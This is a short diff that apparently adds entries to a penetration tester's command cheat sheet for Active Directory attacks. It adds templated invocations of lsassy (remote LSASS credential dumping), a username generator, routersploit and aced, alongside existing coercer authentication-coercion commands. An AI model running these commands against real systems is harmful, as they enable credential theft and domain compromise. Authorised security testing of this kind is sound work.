@@ -86,3 +86,7 @@ powerview $DOMAIN/$USER:$PASSWORD@$DC_IP --web
 arsenal
 coercer scan -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
 coercer coerce -l $LOCAL_IP -t $TARGET -u $USER -p $PASSWORD -d $DOMAIN
+lsassy -d $DOMAIN -u $USER -p $PASSWORD $TARGET
+username_generator -w $NAMESFILE
+routersploit
+aced $DOMAIN/$USER:$PASSWORD@$DC_IP
